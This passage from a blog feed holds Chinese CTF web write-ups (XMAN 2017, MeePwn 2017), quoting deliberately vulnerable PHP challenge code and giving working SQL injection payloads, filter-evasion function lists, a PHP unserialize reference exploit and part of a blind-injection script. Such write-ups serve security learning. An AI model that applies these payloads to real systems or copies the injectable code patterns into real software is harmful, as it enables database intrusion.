class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The tables:"</span></div><div class="line">	target = <span class="string">"tables"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The columns:"</span></div><div class="line">	target = <span class="string">"columns"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The data:"</span></div><div class="line">	target = <span class="string">"data"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/10.jpg?raw=true" alt=""></p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;DO_you_l1ke_sqlmap_sqlmap&#125;</div></pre></td></tr></table></figure></p>
<h1 id="倾听世界的声音"><a href="#倾听世界的声音" class="headerlink" title="倾听世界的声音"></a>倾听世界的声音</h1><p>XSS，还没开始研究。膜拜大佬。</p>
<p>参考：<a href="http://www.cnblogs.com/zaki-Gui/p/7115821.html" target="_blank" rel="external">http://www.cnblogs.com/zaki-Gui/p/7115821.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XMAN选拔赛-2017-web-writeup 都是基础题目&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Meenpwn-2017-web-writeup</title>
    <link href="http://yoursite.com/2017/07/16/Meenpwn-2017-web-writeup/"/>
    <id>http://yoursite.com/2017/07/16/Meenpwn-2017-web-writeup/</id>
    <published>2017-07-16T01:33:43.000Z</published>
    <updated>2017-07-19T08:53:57.826Z</updated>
    
    <content type="html"><![CDATA[<p>考点：反序列化，rand，sql注入<br><a id="more"></a></p>
<h1 id="TSULOTT"><a href="#TSULOTT" class="headerlink" title="TSULOTT"></a>TSULOTT</h1><p>通过查看源代码，可以发现hint，得到源码，这里只贴重点部分。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">&lt;body&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">var</span> $jackpot;</div><div class="line">  <span class="keyword">var</span> $enter;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">include</span>(<span class="string">'secret.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))  </div><div class="line">&#123;</div><div class="line">  $obj = unserialize(base64_decode($_GET[<span class="string">'input'</span>]));</div><div class="line">  <span class="keyword">if</span>($obj)</div><div class="line">  &#123;</div><div class="line">    $obj-&gt;jackpot = rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>).<span class="string">' '</span>.rand(<span class="number">10</span>,<span class="number">99</span>);</div><div class="line">    <span class="keyword">if</span>($obj-&gt;enter === $obj-&gt;jackpot)</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;CONGRATULATION! You Won JACKPOT PriZe !!! &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"</span>. <span class="string">"&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='20'&gt;"</span>.$obj-&gt;jackpot.<span class="string">"&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"</span>;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='green' size='25'&gt;"</span>.$flag.<span class="string">"&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"</span>;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /&gt;&lt;/center&gt;"</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;Wrong! True Six Numbers Are: &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"</span>. <span class="string">"&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='25'&gt;"</span>.$obj-&gt;jackpot.<span class="string">"&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;- Something wrong, do not hack us please! -&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">""</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;center&gt;</div><div class="line">&lt;br&gt;&lt;h2&gt;&lt;font color=<span class="string">'yellow'</span> size=<span class="number">8</span>&gt;-- TSU&lt;/font&gt;&lt;font color=<span class="string">'red'</span> size=<span class="number">8</span>&gt;LOTT --&lt;/font&gt;&lt;/h2&gt;</div><div class="line">&lt;p&gt;&lt;p&gt;&lt;font color=<span class="string">'white'</span>&gt;Input your code to win jackpot!&lt;/font&gt;&lt;p&gt;</div><div class="line">&lt;form&gt;</div><div class="line">          &lt;input type=<span class="string">"text"</span> name=<span class="string">"input"</span> /&gt;&lt;p&gt;&lt;p&gt;</div><div class="line">          &lt;button type=<span class="string">"submit"</span> name=<span class="string">"btn-submit"</span> value=<span class="string">"go"</span>&gt;send&lt;/button&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/center&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'gen_code'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'gen_code'</span>]))</div><div class="line">&#123;</div><div class="line">  $temp = <span class="keyword">new</span> Object;</div><div class="line">  $temp-&gt;enter=$_GET[<span class="string">'gen_code'</span>];</div><div class="line">  $code=base64_encode(serialize($temp));</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;font color=\'white\'&gt;Here is your code, please use it to Lott: &lt;strong&gt;'</span>.$code.<span class="string">'&lt;/strong&gt;&lt;/font&gt;&lt;/center&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;center&gt;</div><div class="line">&lt;font color=<span class="string">'white'</span>&gt;-----------------------------------------------------------------------------------------------------------------------------&lt;/font&gt;</div><div class="line">&lt;h3&gt;&lt;font color=<span class="string">'white'</span>&gt;Take code&lt;/font&gt;&lt;/h3&gt;&lt;p&gt;</div><div class="line">&lt;p&gt;&lt;font color=<span class="string">'white'</span>&gt;Pick your six numbers (Ex: <span class="number">15</span> <span class="number">02</span> <span class="number">94</span> <span class="number">11</span> <span class="number">88</span> <span class="number">76</span>)&lt;/font&gt;&lt;p&gt;</div><div class="line">&lt;form&gt;</div><div class="line">      &lt;input type=<span class="string">"text"</span> name=<span class="string">"gen_code"</span> maxlength=<span class="string">"17"</span> /&gt;&lt;p&gt;&lt;p&gt;</div><div class="line">      &lt;button type=<span class="string">"submit"</span> name=<span class="string">"btn-submit"</span> value=<span class="string">"go"</span>&gt;send&lt;/button&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/center&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'is_debug'</span>]) &amp;&amp; $_GET[<span class="string">'is_debug'</span>]===<span class="string">'1'</span>)</div><div class="line">&#123;</div><div class="line">   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!-- GET is_debug=<span class="number">1</span> --&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure></p>
<p>看到有<code>unserialize</code>，感觉会考反序列化问题。看到有<code>rand()</code>感觉会考随机数预测问题。看到<code>===</code>，一般不存在弱类型问题。从源码上看，这题需要我们预测留个数字，然后序列化再传入并反序列化，与服务器上随机生成的六个数进行对比，若相同则出flag。这题最后用反序列化的方法解出来了。不过这个反序列化的套路跟以前不太一样。利用下面的php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">var</span> $jackpot;</div><div class="line">  <span class="keyword">var</span> $enter;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$chybeta = <span class="keyword">new</span> Object();</div><div class="line">$chybeta-&gt;enter=&amp;$obj-&gt;jackpot;</div><div class="line">$code=base64_encode(serialize($chybeta));</div><div class="line"><span class="keyword">echo</span> $code;</div></pre></td></tr></table></figure></p>
<p>上述代码，将<code>$jackpot</code>的地址赋给<code>$enter</code>，相当于两个指针指到了同一块内存区域，所以不管做什么变化，这两个变量的变化是同步的。</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://128.199.190.23:8001/?input=Tzo2OiJPYmplY3QiOjI6e3M6NzoiamFja3BvdCI7TjtzOjU6ImVudGVyIjtSOjI7fQ%3D%3D&amp;btn-submit=go</div></pre></td></tr></table></figure></p>
<p>FLAG:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MeePwnCTF&#123;__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___&#125;</div></pre></td></tr></table></figure></p>
<p>这个思路当时我想到了但没去尝试，因为当时想的是传给enter的jackpot地址是我本机上的地址，跟服务器上的不同，然后就死磕在rand（）的预测上。在跟一航大佬讨论后，才知道这个姿势可行。永远不要怀疑自己的脑洞。关于php变量的内存分布之后单独开一篇写。</p>
<p>还有就是对rand（）的预测。这个想法不是不无根据，HITCON CTF 2015 Quals Web Giraffe’s Coffee和0CTF 2016 qual rand2都考到过。ph师傅的<a href="https://www.leavesongs.com/PENETRATION/safeboxs-secret.html" target="_blank" rel="external">安全箱子的秘密</a>和Sjoerd Langkemper的<a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="external">Cracking PHP rand()</a>有谈到这个rand()预测的具体技巧和操作。不过我没成功:)</p>
<h1 id="Br0kenMySQL"><a href="#Br0kenMySQL" class="headerlink" title="Br0kenMySQL"></a>Br0kenMySQL</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;</div><div class="line">&lt;p style=<span class="string">'color:Red'</span>&gt;Br0kenMySQL&lt;/p&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>]==<span class="string">'🕵'</span>) <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'config.php'</span>;</div><div class="line"></div><div class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, MYSQL_USER, MYSQL_PASSWORD);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!$link) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!mysqli_select_db($link,MYSQL_USER)) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not select database: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">    $id = $_GET[<span class="string">'id'</span>];</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count#is'</span>,$id))</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</div><div class="line">    $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</div><div class="line">    $row = mysqli_fetch_array($query);</div><div class="line">    $username = $row[<span class="string">'username'</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>($username === <span class="string">'guest'</span>)&#123;</div><div class="line"></div><div class="line">        $ip = @$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]!=<span class="string">""</span> ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count#is'</span>,$ip))</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</div><div class="line">        var_dump($ip);</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($ip))</div><div class="line">            mysqli_query($link,<span class="string">"INSERT INTO logs VALUES('&#123;$ip&#125;')"</span>);</div><div class="line"></div><div class="line">        $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</div><div class="line">        $row = mysqli_fetch_array($query);</div><div class="line">        $username = $row[<span class="string">'username'</span>];</div><div class="line">        <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"What ???????\nLogin as guest&amp;admin at the same time ?\nSeems our code is broken, here is your bounty\n"</span>;</div><div class="line">            <span class="keyword">die</span>(FLAG);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Nothing here"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Hello "</span>.$username;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/h1&gt;</div><div class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
<p>从源码来看，逻辑上我们得先让<code>$username</code>值为<code>guest</code>进入if判断后，再让<code>$username</code>的值为<code>admin</code>，从而echo出flag。而且<code>$id</code>处可注入。做法是找到一个随机串，利用case语句在不同情况下随机取值，结合爆破，拿flag。<br>题目把<code>rand()</code>，<code>floor()</code>等过滤了，不能直接生成随机数。可以利用mysql内置的一些函数或变量，比如时间戳。因此有了下面的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://139.59.239.133/?id=(SELECT case MOD(UNIX_TIMESTAMP(),3) when 1 then 2 else 1 end;)</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170715/3.jpg?raw=true" alt=""></p>
<p>FLAG:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MeePwnCTF&#123;_b4by_tr1ck_fixed&#125;</div></pre></td></tr></table></figure></p>
<p>除了用UNIX_TIMESTAMP()，其他一些函数/变量也行，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">uuid()</div><div class="line">UUID_SHORT()  // mysql 5.1后有</div><div class="line">CURRENT_TIMESTAMP()</div><div class="line">CURRENT_TIMESTAMP</div><div class="line">CURTIME()</div><div class="line">localtime()</div><div class="line">localtime</div><div class="line">localtimestamp()</div><div class="line">localtimestamp</div><div class="line">now()</div><div class="line">sysdate()</div><div class="line">utc_timestamp()</div></pre></td></tr></table></figure></p>
<h1 id="Br0kenMySQL-v2"><a href="#Br0kenMySQL-v2" class="headerlink" title="Br0kenMySQL v2"></a>Br0kenMySQL v2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">Br0kenMySQL</div><div class="line">&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;</div><div class="line">&lt;p style=<span class="string">'color:Red'</span>&gt;Br0kenMySQL&lt;/p&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>]==<span class="string">'🕵'</span>) <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</div><div class="line"><span class="keyword">require</span> <span class="string">'../config.php'</span>;</div><div class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, MYSQL_USER, MYSQL_PASSWORD);</div><div class="line"><span class="keyword">if</span> (!$link) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!mysqli_select_db($link,MYSQL_USER)) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not select database: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">    $id = $_GET[<span class="string">'id'</span>];</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count|select|from|\(|\)#is'</span>,$id))</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</div><div class="line">    $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</div><div class="line">    $row = mysqli_fetch_array($query);</div><div class="line">    $username = $row[<span class="string">'username'</span>];</div><div class="line">    <span class="keyword">if</span>($username === <span class="string">'guest'</span>)&#123;</div><div class="line">        $ip = @$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]!=<span class="string">""</span> ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count|select|from|\(|\)#is'</span>,$ip))</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</div><div class="line">        var_dump($ip);</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($ip))</div><div class="line">            mysqli_query($link,<span class="string">"INSERT INTO logs VALUES('&#123;$ip&#125;')"</span>);</div><div class="line">        $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</div><div class="line">        $row = mysqli_fetch_array($query);</div><div class="line">        $username = $row[<span class="string">'username'</span>];</div><div class="line">        <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"What, again ???????!@#$!@#$!@#$\n"</span>;</div><div class="line">            <span class="keyword">die</span>(FLAG_2);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Nothing here"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Hello "</span>.$username;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/h1&gt;</div><div class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
<p>相比较于第一题，过滤了select，和括号（），所以需要换其他方法。类似前面，需要找到一个随机的方法，使得id的值在某些情况下为1（admin），为2（guest），并且不需要括号。比如对一个“随机”值，对其进行mod 2，得到的结果是0或1，我们只要再加上1，就能得到对应的1或2。<br>几种payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 + CURRENT_TIMESTAMP%2</div><div class="line">1 + localtime%2</div><div class="line">1 + localtimestamp%2</div><div class="line">1 + utc_timestamp%2</div></pre></td></tr></table></figure></p>
<p>当然在发送的时候要进行url编码，+替换为%2b,%替换为%25</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MeePwnCTF&#123;_I_g1ve__uPPPPPPPP&#125;</div></pre></td></tr></table></figure>
<h1 id="Br0kenMySQL-v3"><a href="#Br0kenMySQL-v3" class="headerlink" title="Br0kenMySQL v3"></a>Br0kenMySQL v3</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">Br0kenMySQL</div><div class="line">&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;</div><div class="line">&lt;p style=&apos;color:Red&apos;&gt;Br0kenMySQL&lt;/p&gt;</div><div class="line">&lt;?php</div><div class="line"></div><div class="line">if($_GET[&apos;debug&apos;]==&apos;🕵&apos;) die(highlight_file(__FILE__));</div><div class="line"></div><div class="line">require &apos;../config.php&apos;;</div><div class="line"></div><div class="line">$link = mysqli_connect(&apos;localhost&apos;, MYSQL_USER, MYSQL_PASSWORD);</div><div class="line"></div><div class="line">if (!$link) &#123;</div><div class="line">    die(&apos;Could not connect: &apos; . mysql_error());</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (!mysqli_select_db($link,MYSQL_USER)) &#123;</div><div class="line">    die(&apos;Could not select database: &apos; . mysql_error());</div><div class="line">&#125;</div><div class="line">    $id = $_GET[&apos;id&apos;];</div><div class="line">    if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$id))</div><div class="line">        die(&apos;Don\&apos;t hurt me :-(&apos;);</div><div class="line">    $query = mysqli_query($link,&quot;SELECT username FROM users WHERE id = &quot;. $id);</div><div class="line">    $row = mysqli_fetch_array($query);</div><div class="line">    $username = $row[&apos;username&apos;];</div><div class="line"></div><div class="line">    if($username === &apos;guest&apos;)&#123;</div><div class="line">        sleep(5); // wait</div><div class="line">        $ip = @$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]!=&quot;&quot; ? $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] : $_SERVER[&apos;REMOTE_ADDR&apos;];</div><div class="line">        if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$ip))</div><div class="line">            die(&apos;Don\&apos;t hurt me :-(&apos;);</div><div class="line">        var_dump($ip);</div><div class="line">        if(!empty($ip))</div><div class="line">            mysqli_query($link,&quot;INSERT INTO logs VALUES(&apos;&#123;$ip&#125;&apos;)&quot;);</div><div class="line"></div><div class="line">        $query = mysqli_query($link,&quot;SELECT username FROM users WHERE id = &quot;. $id);</div><div class="line">        $row = mysqli_fetch_array($query);</div><div class="line">        $username = $row[&apos;username&apos;];</div><div class="line">        if($username === &apos;admin&apos;)&#123;</div><div class="line">            echo &quot;What, again ???????!@#$!@#$!@#$\n&quot;;</div><div class="line">            echo &quot;Last one, promise!\n&quot;;</div><div class="line">            die(FLAG_3);</div><div class="line">        &#125;</div><div class="line">        echo &quot;Nothing here&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">        echo &quot;Hello &quot;.$username;</div><div class="line">    &#125;</div><div class="line">?&gt;</div><div class="line">&lt;/h1&gt;</div><div 